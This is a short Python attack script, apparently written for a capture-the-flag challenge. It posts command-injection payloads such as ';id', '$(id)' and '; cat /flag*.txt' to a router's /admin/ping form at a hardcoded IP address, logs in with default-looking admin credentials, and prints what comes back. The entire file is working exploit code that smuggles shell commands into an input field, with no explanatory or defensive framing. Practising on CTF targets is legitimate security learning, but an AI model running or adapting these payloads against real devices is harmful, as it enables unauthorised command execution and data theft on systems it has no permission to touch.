#!/usr/bin/env python3
import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Test command injection on /admin/ping
payloads = [
    "127.0.0.1;id",
    "127.0.0.1|id",
    "127.0.0.1$(id)",
    "127.0.0.1`id`",
    "; cat /flag*.txt",
]

for payload in payloads:
    print(f"\n--- Testing: {payload} ---")
    try:
        r = requests.post(f"{URL}/admin/ping", auth=AUTH, data={"ip": payload}, timeout=10)
        print(f"Status: {r.status_code}")
        print(r.text[:500] if len(r.text) > 500 else r.text)
    except Exception as e:
        print(f"Error: {e}")